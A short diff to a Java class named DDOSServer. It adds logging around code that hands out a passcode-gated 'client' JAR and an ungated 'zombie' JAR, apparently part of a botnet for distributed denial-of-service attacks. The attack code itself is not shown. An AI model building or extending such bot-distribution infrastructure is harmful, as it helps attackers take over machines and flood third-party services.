@@ -49,14 +49,20 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 		try {
 			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
 			if (initialPackage.hasMessage()) {
+				System.out.println(event.getConnection().getRemoteSocketAddress() + " A computer has request a jar: "
+						+ initialPackage.getMessage() + " (ID: " + initialPackage.getId() + ")");
 				if (initialPackage.getMessage().equals("CLIENT_JAR_REQUEST")) {
 					if (CLIENT_JAR_CODE.equals(initialPackage.getObjects()[0])) {
 						event.getOutputStream().writeFile(CLIENT_JAR_FILE);
+						System.out.println(event.getConnection().getRemoteSocketAddress() + " Sent client JAR file.");
 					} else {
 						event.getOutputStream().writeObject(new DataPackage().setMessage("INVALID_REQUEST"));
+						System.out.println(event.getConnection().getRemoteSocketAddress()
+								+ " Failed to send client JAR file due to an invalid passcode.");
 					}
 				} else if (initialPackage.getMessage().equals("ZOMBIE_JAR_REQUEST")) {
 					event.getOutputStream().writeFile(ZOMBIE_JAR_FILE);
+					System.out.println(event.getConnection().getRemoteSocketAddress() + " Sent zombie JAR file.");
 				}
 				Thread.sleep(3000);
 				event.getConnection().close();
